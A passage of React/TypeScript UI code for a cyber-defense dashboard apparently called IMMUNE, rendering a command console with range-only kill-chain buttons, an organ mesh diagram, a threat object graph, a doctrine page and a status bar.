                <div className="flex items-center justify-between gap-2">
                  <span className="font-mono text-xs text-primary">{s.channel}</span>
                  <Badge tone={s.state === "dark" ? "ok" : s.state === "beaconing" ? "danger" : "range"}>{s.state}</Badge>
                </div>
                <p className="mt-1 font-mono text-[10px] uppercase text-muted">{s.persona}</p>
              </button>
            </li>
          ))}
        </ul>
        {selected && (
          <div className="mt-4 grid gap-2">
            {selected.rangeOnly && (
              <>
                <Button className="w-full" disabled={commandBusy} onClick={() => void authorize(selected.id)}>
                  Authorize RANGE kill-chain
                </Button>
                <Button className="w-full" disabled={commandBusy} onClick={() => void enterDive(selected.id)}>
                  Wraith dive RANGE C2
                </Button>
                <Button className="w-full" variant="outline" disabled={commandBusy} onClick={() => openEchoTheater(selected.id)}>
                  Open Echo theater
                </Button>
              </>
            )}
            <Button
              className="w-full"
              variant={selected.rangeOnly ? "danger" : "outline"}
              disabled={commandBusy}
              onClick={() => void runKillChain(selected.id)}
            >
              {selected.rangeOnly ? "Run RANGE kill-chain" : "Run LIVE defensive chain"}
            </Button>
          </div>
        )}
      </section>
      <section className="hud-panel flex min-h-0 flex-col overflow-hidden p-4">
        <div className="flex items-center gap-2 text-primary">
          <Terminal className="size-4" />
          <p className="font-mono text-[10px] uppercase tracking-wider">Console · YAWAR sealed</p>
        </div>
        {dossier && (
          <article className="mt-3 rounded-md border border-border bg-bg-subtle p-3">
            <p className="font-mono text-[10px] uppercase tracking-wider text-muted">
              Dossier · {dossier.confidence}
            </p>
            <p className="mt-2 text-xs"><span className="text-muted">Motive.</span> {dossier.motive}</p>
            <p className="mt-1 text-xs"><span className="text-muted">Capability.</span> {dossier.capability}</p>
            <p className="mt-1 text-xs"><span className="text-muted">Opportunity.</span> {dossier.opportunity}</p>
            <p className="mt-2 font-mono text-[10px] text-subtle">{chain.join(" → ")}</p>
          </article>
        )}
        <ul className="mt-3 min-h-0 flex-1 space-y-1.5 overflow-y-auto font-mono text-[11px] leading-relaxed">
          {terminal.map((line) => (
            <li
              key={line.id}
              className={cn(
                "whitespace-pre-wrap",
                line.kind === "in" && "text-primary",
                line.kind === "ok" && "text-ok",
                line.kind === "block" && "text-danger",
                line.kind === "out" && "text-muted",
              )}
            >
              {line.kind === "in" ? `GHOST▸ ${line.text}` : line.text}
            </li>
          ))}
        </ul>
      </section>
    </div>
  );
}

export function CommandDock() {
  const [live, setLive] = useState(false);
  const [draft, setDraft] = useState("");
  const runCommand = useImmune((s) => s.runCommand);
  const commandBusy = useImmune((s) => s.commandBusy);
  const dive = useImmune((s) => s.dive);
  const view = useImmune((s) => s.view);
  const prompt = dive ? "WRAITH▸" : view === "echo" ? "ECHO▸" : "GHOST▸";
  const hint = dive
    ? "ls · exploit c2 · plant honey · collapse · hack people"
    : "authorize ghost · echo ghost · dive ghost · hack people";
  useEffect(() => {
    setLive(true);
  }, []);
  if (!live) {
    return <div className="h-[60px] border-t border-border bg-bg-elevated" aria-hidden="true" />;
  }
  return (
    <form
      className="flex items-center gap-2 border-t border-border bg-bg-elevated px-3 py-2 sm:px-4"
      onSubmit={(e) => {
        e.preventDefault();
        const value = draft;
        setDraft("");
        void runCommand(value);
      }}
    >
      <label className="sr-only" htmlFor="ghost-command">
        {dive ? "Wraith command" : view === "echo" ? "Echo command" : "Ghost hunter command"}
      </label>
      <span className="shrink-0 font-mono text-xs text-primary">{prompt}</span>
      <input
        id="ghost-command"
        value={draft}
        onChange={(e) => setDraft(e.target.value)}
        placeholder={hint}
        autoComplete="off"
        spellCheck={false}
        className="h-11 min-w-0 flex-1 rounded-md border border-border bg-bg px-3 font-mono text-sm"
      />
      <Button type="submit" size="sm" disabled={commandBusy || !draft.trim()}>
        {commandBusy ? "…" : "Execute"}
      </Button>
    </form>
  );
}

const MESH_POS: Record<string, { x: number; y: number }> = {
  immune: { x: 50, y: 22 },
  a11oy: { x: 18, y: 62 },
  killinchu: { x: 82, y: 62 },
  khipu: { x: 50, y: 88 },
};

export function MeshView() {
  const up = MESH_ORGANS.filter((o) => o.quorum).length;
  const quorum = up >= 3;
  return (
    <section className="hud-panel min-h-0 overflow-y-auto p-4 sm:p-5">
      <div className="flex flex-wrap items-center justify-between gap-2">
        <div className="flex items-center gap-2 text-primary">
          <Network className="size-4" />
          <h2 className="text-sm font-semibold">JADC2 fusion mesh</h2>
        </div>
        <Badge tone={quorum ? "ok" : "danger"}>{quorum ? "3-of-4 quorum" : "degraded"}</Badge>
      </div>
      <p className="mt-2 max-w-3xl text-sm text-muted">
        Four organs, one decision. killinchu fuses physical tracks. IMMUNE admits and receipts. a11oy discloses signer
        state. Khipu proposes, never executes. Quorum is a BFT silhouette — MODELED until a live observation is wired.
      </p>
      <div className="relative mt-4 overflow-hidden rounded-md border border-border bg-bg">
        <svg viewBox="0 0 100 100" className="h-[280px] w-full sm:h-[340px]" role="img" aria-label="SZL organ mesh">
          <defs>
            <radialGradient id="mesh-glow" cx="50%" cy="50%" r="50%">
              <stop offset="0%" stopColor="#5eead4" stopOpacity="0.22" />
              <stop offset="100%" stopColor="#5eead4" stopOpacity="0" />
            </radialGradient>
          </defs>
          <rect width="100" height="100" fill="url(#mesh-glow)" />
          <polygon
            points="50,22 18,62 50,88 82,62"
            fill="none"
            stroke="#5eead4"
            strokeOpacity="0.45"
            strokeWidth="0.4"
          />
          <line x1="50" y1="22" x2="50" y2="88" stroke="#5eead4" strokeOpacity="0.2" strokeWidth="0.25" />
          <line x1="18" y1="62" x2="82" y2="62" stroke="#5eead4" strokeOpacity="0.2" strokeWidth="0.25" />
          {MESH_ORGANS.map((o) => {
            const p = MESH_POS[o.id];
            if (!p) return null;
            return (
              <g key={o.id}>
                <circle cx={p.x} cy={p.y} r="6.2" fill="#07090c" stroke="#5eead4" strokeWidth="0.5" />
                <circle cx={p.x} cy={p.y} r="2.2" fill="#5eead4" className="origin-center" />
                <text x={p.x} y={p.y - 8} textAnchor="middle" fill="#e8eef4" fontSize="3.4" fontFamily="IBM Plex Sans">
                  {o.name}
                </text>
              </g>
            );
          })}
        </svg>
      </div>
      <div className="mt-4 grid gap-3 sm:grid-cols-2">
        {MESH_ORGANS.map((o) => (
          <a
            key={o.id}
            href={o.href}
            target="_blank"
            rel="noreferrer"
            className="rounded-md border border-border bg-bg-subtle p-3 transition-colors hover:border-primary"
          >
            <div className="flex items-center justify-between gap-2">
              <p className="text-sm font-medium">{o.name}</p>
              <span className="font-mono text-[10px] text-primary">{Math.round(o.health * 100)}%</span>
            </div>
            <p className="mt-1 text-xs text-muted">
              {o.role} · {o.domain}
            </p>
            <div className="mt-2 h-1 overflow-hidden rounded-full bg-bg">
              <div className="h-full bg-primary" style={{ width: `${Math.round(o.health * 100)}%` }} />
            </div>
          </a>
        ))}
      </div>
    </section>
  );
}

const GRAPH_POS: Record<string, { x: number; y: number }> = {
  "APT-GHOST": { x: 10, y: 18 },
  "APT-MIRROR": { x: 10, y: 48 },
  "CISA KEV": { x: 12, y: 80 },
  "Khipu-1.5B": { x: 36, y: 16 },
  SENTRA: { x: 38, y: 42 },
  a11oy: { x: 38, y: 78 },
  IMMUNE: { x: 58, y: 50 },
  YAWAR: { x: 78, y: 22 },
  HUKLLA: { x: 78, y: 72 },
  killinchu: { x: 58, y: 84 },
  Rekor: { x: 92, y: 18 },
  DEADMAN: { x: 92, y: 86 },
};

export function GraphView() {
  const select = useImmune((s) => s.select);
  const campaigns = useImmune((s) => s.campaigns);
  const nodes = Object.keys(GRAPH_POS);
  return (
    <section className="hud-panel min-h-0 overflow-y-auto p-4 sm:p-5">
      <div className="flex items-center gap-2 text-primary">
        <Share2 className="size-4" />
        <h2 className="text-sm font-semibold">Object graph</h2>
      </div>
      <p className="mt-2 max-w-3xl text-sm text-muted">
        Palantir-style: every campaign, organ, receipt, and CVE is a typed object. Relationships are named. Nothing is a
        blended green blob.
      </p>
      <div className="relative mt-4 overflow-hidden rounded-md border border-border bg-bg">
        <svg viewBox="0 0 100 100" className="h-[300px] w-full sm:h-[380px]" role="img" aria-label="Lattice object graph">
          {GRAPH_EDGES.map((e) => {
            const a = GRAPH_POS[e.from];
            const b = GRAPH_POS[e.to];
            if (!a || !b) return null;
            return (
              <g key={`${e.from}-${e.rel}-${e.to}`}>
                <line x1={a.x} y1={a.y} x2={b.x} y2={b.y} stroke="#5eead4" strokeOpacity="0.28" strokeWidth="0.35" />
                <text
                  x={(a.x + b.x) / 2}
                  y={(a.y + b.y) / 2 - 1.6}
                  textAnchor="middle"
                  fill="#8b96a5"
                  fontSize="2.2"
                  fontFamily="IBM Plex Mono"
                >
                  {e.rel}
                </text>
              </g>
            );
          })}
          {nodes.map((name) => {
            const p = GRAPH_POS[name];
            const hostile = name.startsWith("APT") || name === "DEADMAN";
            const campaign = campaigns.find((c) => c.actor.includes(name) || c.name.includes(name));
            return (
              <g
                key={name}
                className={campaign ? "cursor-pointer" : undefined}
                onClick={() => campaign && select(campaign.id)}
              >
                <circle
                  cx={p.x}
                  cy={p.y}
                  r="3.4"
                  fill="#07090c"
                  stroke={hostile ? "#f07167" : "#5eead4"}
                  strokeWidth="0.5"
                />
                <text
                  x={p.x}
                  y={p.y - 5}
                  textAnchor="middle"
                  fill={hostile ? "#f07167" : "#e8eef4"}
                  fontSize="2.6"
                  fontFamily="IBM Plex Sans"
                >
                  {name}
                </text>
              </g>
            );
          })}
        </svg>
      </div>
      <ul className="mt-4 grid gap-1.5 sm:grid-cols-2">
        {GRAPH_EDGES.map((e) => (
          <li key={`${e.from}-${e.rel}-${e.to}`} className="font-mono text-[11px] text-muted">
            <span className="text-primary">{e.from}</span>
            <span> — {e.rel} → </span>
            <span className="text-fg">{e.to}</span>
          </li>
        ))}
      </ul>
    </section>
  );
}

export function DoctrineView() {
  return (
    <section className="hud-panel min-h-0 overflow-y-auto p-4 sm:p-5">
      <div className="flex items-center gap-2 text-primary">
        <Fingerprint className="size-4" />
        <h2 className="text-sm font-semibold">Taken from the leaders — made ours</h2>
      </div>
      <p className="mt-2 max-w-3xl text-sm text-muted">
        Palantir Action Types. Anduril Lattice tasking. OverWatch hunting leads. Model Armor floor-settings. Sigstore
        envelopes. Independently implemented under Doctrine v11 — Λ remains Conjecture 1. Hunt · isolate · deceive.
        Never strike people.
      </p>
      <div className="mt-5 grid gap-4 lg:grid-cols-2 xl:grid-cols-4">
        {LEADERS.map((cat) => (
          <div key={cat.category}>
            <p className="font-mono text-[10px] uppercase tracking-wider text-muted">{cat.category}</p>
            <div className="mt-2 space-y-2">
              {cat.members.map((m) => (
                <a
                  key={m.name}
                  href={m.url}
                  target="_blank"
                  rel="noreferrer"
                  className="block rounded-md border border-border bg-bg-subtle p-3 transition-colors hover:border-primary"
                >
                  <p className="flex items-center justify-between gap-2 text-sm font-medium">
                    {m.name}
                    <ExternalLink className="size-3.5 text-muted" />
                  </p>
                  <p className="mt-1 text-xs text-muted">{m.what}</p>
                  <p className="mt-2 text-xs text-fg">{m.take}</p>
                </a>
              ))}
            </div>
          </div>
        ))}
      </div>
    </section>
  );
}

export function StatusBar() {
  const mode = useImmune((s) => s.mode);
  const chain = useImmune((s) => s.chain);
  const chainOk = useImmune((s) => s.chainOk);
  const feeds = useImmune((s) => s.feeds);
  const campaigns = useImmune((s) => s.campaigns);
  const inbound = campaigns.filter((c) => c.status === "inbound").length;
  return (
    <footer className="flex flex-wrap items-center gap-x-4 gap-y-1 border-t border-border bg-bg-elevated px-4 py-2 font-mono text-[10px] uppercase tracking-wider text-muted">
      <span className="inline-flex items-center gap-1.5">
        {mode === "DEADMAN" ? <Skull className="size-3 text-danger" /> : <Activity className="size-3 text-primary" />}
        {mode}
      </span>
      <span className={chainOk ? "text-ok" : "text-danger"}>YAWAR {chainOk ? "verified" : "broken"} · {chain.length}</span>
      <span>KEV {feeds?.kev.provenance ?? "…"}</span>
      <span>HF {feeds?.estate.provenance ?? "…"}</span>
      <span>Rekor {feeds?.rekor.provenance ?? "…"}</span>
      <span>
        Spaces{" "}
        {(feeds?.estate.spaces ?? []).filter((s) => (s.stage ?? "").toUpperCase() === "RUNNING").length}/
        {(feeds?.estate.spaces ?? []).length}
      </span>
      <span className="inline-flex items-center gap-1">
        <Crosshair className="size-3" />
        {inbound} inbound
      </span>
      <span className="hidden text-subtle lg:inline">
        MODE=DEFENSE ONLY · HUNT · ISOLATE · DECEIVE · NO HUMAN TARGETING
      </span>
    </footer>
  );
}
